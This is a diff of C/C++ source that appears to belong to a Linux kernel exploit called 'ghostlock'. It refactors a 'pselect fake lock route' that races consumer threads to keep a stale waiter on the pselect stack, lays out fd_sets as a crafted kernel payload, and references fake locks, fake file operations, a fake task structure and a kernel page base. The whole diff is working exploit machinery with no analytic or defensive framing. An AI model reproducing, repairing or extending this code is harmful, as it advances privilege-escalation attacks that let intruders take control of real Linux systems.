@@ -625,7 +625,8 @@ static void pselect_put_waiter_word(
         int waiter_word, uint64_t value, const char *name) {
     int global_word = pselect_waiter_shift(context) + waiter_word;
     int placed = pselect_put_global_word(
-            &context->input_set, &context->output_set, &context->exception_set,
+            context->input_set.raw(), context->output_set.raw(),
+            context->exception_set.raw(),
             words_per_set, global_word, value);
     if (!placed) {
         pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
@@ -677,10 +678,10 @@ void reserve_standard_io(void) {
 /* Decoupling plan: restore standard descriptors from route-owned backups.
  * Input: route context; output: restored/closed state. Future:
  * select_stack_restore_stdio(SelectStackRouteContext *). */
-static void restore_standard_io(const int backup[3]) {
+static void restore_standard_io(const ghostlock::BorrowedFd backup[3]) {
     for (int fd = 0; fd < 3; fd++) {
-        if (backup[fd] < 0) continue;
-        dup2(backup[fd], fd);
+        if (!backup[fd].valid()) continue;
+        dup2(backup[fd].get(), fd);
     }
 }
 
@@ -688,13 +689,13 @@ static void restore_standard_io(const int backup[3]) {
  * profile, payload layout and write request; output: three fd_sets. Future:
  * select_stack_build_fdsets(profile, payload, request, result). */
 static void select_stack_build_fdsets(SelectStackRouteContext *context) {
-    fd_set *in = &context->input_set;
-    fd_set *out = &context->output_set;
-    fd_set *ex = &context->exception_set;
+    ghostlock::FdSet *in = &context->input_set;
+    ghostlock::FdSet *out = &context->output_set;
+    ghostlock::FdSet *ex = &context->exception_set;
     const WriteRequest *request = context->request;
-    FD_ZERO(in);
-    FD_ZERO(out);
-    FD_ZERO(ex);
+    in->zero();
+    out->zero();
+    ex->zero();
 
     int words_per_set = pselect_words_per_set();
     int compact = context->layout.compact_waiter;
@@ -752,167 +753,110 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
     }
 }
 
-static int select_stack_fail(SelectStackRouteContext *context,
-        int step, int error_number) {
-    context->status.step = step;
-    context->status.error_number = error_number;
-    return -1;
-}
-
-static int select_stack_prepare(SelectStackRouteContext *context) {
+int ghostlock::SelectStackRoute::prepare() noexcept {
     if (!page_base || !fake_lock || !fake_fops) {
         pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                    "fops=%016zx\n", page_base, fake_lock, fake_fops);
-        return select_stack_fail(context, 30, 0);
+        return fail(30, 0);
     }
-    if (pipe(context->pipe_fd) != 0) {
-        return select_stack_fail(context, 31, errno);
+    int fds[2];
+    if (pipe(fds) != 0) {
+        return fail(31, errno);
     }
+    pipe_read.reset(fds[0]);
+    pipe_write.reset(fds[1]);
 
     /* Both routes park on a never-ready timerfd: the waiter must stay stale
      * on the pselect stack for the whole consumer window. */
-    context->block_fd =
-            (int) syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC);
-    if (context->block_fd < 0) {
+    block.reset((int) syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC));
+    if (!block.valid()) {
         pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
-        context->block_fd = context->pipe_fd[0];
+        block_borrows_pipe = 1;
     }
-    context->high_read_fd =
-            fcntl(context->block_fd, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16);
-    if (context->high_read_fd < 0) {
+    high_read.reset(fcntl(block_fd(), F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16));
+    if (!high_read.valid()) {
         pr_warning("pselect F_DUPFD read errno=%d\n", errno);
-        return select_stack_fail(context, 32, errno);
+        return fail(32, errno);
     }
 
-    select_stack_build_fdsets(context);
+    select_stack_build_fdsets(this);
     pr_info("pselect route setup shift=%d page=%016zx "
             "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
             "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
             "ex1=%016llx ex2=%016llx ex3=%016llx\n",
-            pselect_waiter_shift(context),
+            pselect_waiter_shift(this),
             page_base, fake_lock, fake_w0, fake_task,
-            (unsigned long long) fdset_get_word(&context->input_set, 0),
-            (unsigned long long) fdset_get_word(&context->input_set, 3),
-            (unsigned long long) fdset_get_word(&context->output_set, 0),
-            (unsigned long long) fdset_get_word(&context->exception_set, 0),
-            (unsigned long long) fdset_get_word(&context->exception_set, 1),
-            (unsigned long long) fdset_get_word(&context->exception_set, 2),
-            (unsigned long long) fdset_get_word(&context->exception_set, 3));
+            (unsigned long long) fdset_get_word(input_set.raw(), 0),
+            (unsigned long long) fdset_get_word(input_set.raw(), 3),
+            (unsigned long long) fdset_get_word(output_set.raw(), 0),
+            (unsigned long long) fdset_get_word(exception_set.raw(), 0),
+            (unsigned long long) fdset_get_word(exception_set.raw(), 1),
+            (unsigned long long) fdset_get_word(exception_set.raw(), 2),
+            (unsigned long long) fdset_get_word(exception_set.raw(), 3));
 
     /* The route may replace low fds, including stdout and stderr. */
-    open_selected_fds(&context->input_set, &context->output_set,
-            &context->exception_set, context->high_read_fd,
-            context->pipe_fd[1]);
-    context->owned_input_set = context->input_set;
-    context->owned_output_set = context->output_set;
-    context->owned_exception_set = context->exception_set;
-    close(context->high_read_fd);
-    context->high_read_fd = -1;
-    context->selected_fds_installed = 1;
+    open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
+            high_read.get(), pipe_write.get());
+    owned_input_set = input_set;
+    owned_output_set = output_set;
+    owned_exception_set = exception_set;
+    high_read.reset();
+    selected_fds_installed = 1;
     return 0;
 }
 
-static RouteStatus select_stack_execute(SelectStackRouteContext *context) {
+RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
     struct timespec route_t0;
     clock_gettime(CLOCK_MONOTONIC, &route_t0);
 
-    atomic_store(&context->race->consumer_calls, 0);
-    atomic_store(&context->race->consumer_success, 0);
-    atomic_store(&context->race->consumer_stop, 0);
-    int delay_usec = route_delay_usec(context, 1);
-    atomic_store(&context->race->route_delay_usec, delay_usec);
-    atomic_store(&context->race->consumer_go, 1);
+    atomic_store(&race->consumer_calls, 0);
+    atomic_store(&race->consumer_success, 0);
+    atomic_store(&race->consumer_stop, 0);
+    int delay_usec = route_delay_usec(this, 1);
+    atomic_store(&race->route_delay_usec, delay_usec);
+    atomic_store(&race->consumer_go, 1);
 
     pr_info("pselect pre-select compact=%d +%.0fms\n",
-            context->layout.compact_waiter,
+            layout.compact_waiter,
             fops_elapsed_ms(&route_t0));
     errno = 0;
-    if (context->layout.compact_waiter) {
-        uint32_t timeout_us = context->execution->select_timeout_us;
+    if (layout.compact_waiter) {
+        uint32_t timeout_us = execution->select_timeout_us;
         struct timespec ts = {
                 .tv_sec = timeout_us / 1000000,
                 .tv_nsec = (long) (timeout_us % 1000000) * 1000,
         };
-        context->select_result = pselect(
-                PSELECT_ROUTE_NFDS, &context->input_set, &context->output_set,
-                &context->exception_set, &ts, NULL);
+        select_result = pselect(
+                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
+                exception_set.raw(), &ts, NULL);
     } else {
-        uint32_t timeout_us = context->execution->select_timeout_us;
+        uint32_t timeout_us = execution->select_timeout_us;
         struct timeval timeout = {
                 .tv_sec = timeout_us / 1000000,
                 .tv_usec = timeout_us % 1000000,
         };
-        context->select_result = select(
-                PSELECT_ROUTE_NFDS, &context->input_set, &context->output_set,
-                &context->exception_set, &timeout);
+        select_result = select(
+                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
+                exception_set.raw(), &timeout);
     }
-    context->select_errno = errno;
-    restore_standard_io(context->stdio_backup);
+    select_errno = errno;
+    restore_standard_io(stdio_backup);
     pr_info("pselect post-select compact=%d +%.0fms ret=%d\n",
-            context->layout.compact_waiter, fops_elapsed_ms(&route_t0),
-            context->select_result);
-    atomic_store(&context->race->consumer_go, 0);
+            layout.compact_waiter, fops_elapsed_ms(&route_t0),
+            select_result);
+    atomic_store(&race->consumer_go, 0);
 
-    context->calls = atomic_load(&context->race->consumer_calls);
-    context->successes = atomic_load(&context->race->consumer_success);
-    if (context->calls > 0 && context->successes > 0) {
-        context->status.code = ROUTE_OK;
-        context->status.step = 0;
-        context->status.error_number = 0;
+    calls = atomic_load(&race->consumer_calls);
+    successes = atomic_load(&race->consumer_success);
+    if (calls > 0 && successes > 0) {
+        status.code = ROUTE_OK;
+        status.step = 0;
+        status.error_number = 0;
     } else {
-        select_stack_fail(context, 33, context->select_errno);
+        (void) fail(33, select_errno);
     }
-    return context->status;
-}
-
-static void select_stack_disarm(SelectStackRouteContext *context) {
-    atomic_store(&context->race->consumer_go, 0);
-    if (atomic_load(&context->race->consumer_inflight) != 0) {
-        for (int i = 0;
-             i < 2000 && atomic_load(&context->race->consumer_inflight) != 0;
-             i++) {
-            usleep(1000);
-        }
-        context->consumer_stuck =
-                atomic_load(&context->race->consumer_inflight) != 0;
-    }
-    context->status.kernel_disarmed = !context->consumer_stuck;
-}
-
-static void select_stack_destroy(SelectStackRouteContext *context) {
-    restore_standard_io(context->stdio_backup);
-    if (context->consumer_stuck) {
-        select_stack_fail(context, 34, context->select_errno);
-        context->status.code = ROUTE_DIRTY_FAILURE;
-        pr_error("pselect consumer still inflight; leaking route fds\n");
-        return;
-    }
-    if (context->selected_fds_installed) {
-        for (int fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
-            if (FD_ISSET(fd, &context->owned_input_set) ||
-                    FD_ISSET(fd, &context->owned_output_set) ||
-                    FD_ISSET(fd, &context->owned_exception_set)) {
-                close(fd);
-                if (context->block_fd == fd) context->block_fd = -1;
-                if (context->pipe_fd[0] == fd) context->pipe_fd[0] = -1;
-                if (context->pipe_fd[1] == fd) context->pipe_fd[1] = -1;
-            }
-        }
-        context->selected_fds_installed = 0;
-    }
-    if (context->high_read_fd >= 0) close(context->high_read_fd);
-    if (context->block_fd >= 0 && context->block_fd != context->pipe_fd[0]) {
-        close(context->block_fd);
-    }
-    if (context->pipe_fd[0] >= 0) close(context->pipe_fd[0]);
-    if (context->pipe_fd[1] >= 0) close(context->pipe_fd[1]);
-    context->high_read_fd = context->block_fd = -1;
-    context->pipe_fd[0] = context->pipe_fd[1] = -1;
-    context->status.userspace_clean = 1;
-    if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
-        context->status.code = ROUTE_FALLBACK_SAFE;
-    }
+    return status;
 }
 
 RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
@@ -920,16 +864,19 @@ RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
      * rebuild both HeapContext payload ownership and PiRaceContext sequencing.
      * Keep this route invocation single-shot until ExploitSession can create a
      * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
-    SelectStackRouteContext context;
-    select_stack_route_context_init(
-            &context, &g_pi_race_context, request, execution_settings(),
+    SelectStackRouteContext context(
+            &g_pi_race_context, request, execution_settings(),
             target_profile_select_stack_layout(&g_target_profile),
             standard_io_backup);
-    if (select_stack_prepare(&context) == 0) {
-        select_stack_execute(&context);
+    if (context.prepare() == 0) {
+        (void) context.execute();
     }
-    select_stack_disarm(&context);
-    select_stack_destroy(&context);
+    context.disarm();
+    context.destroy();
+    if (context.status.code == ROUTE_DIRTY_FAILURE &&
+            context.status.step == 34) {
+        pr_error("pselect consumer still inflight; leaking route fds\n");
+    }
 
     pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
             "step=%d errno=%d\n", context.calls, context.successes,
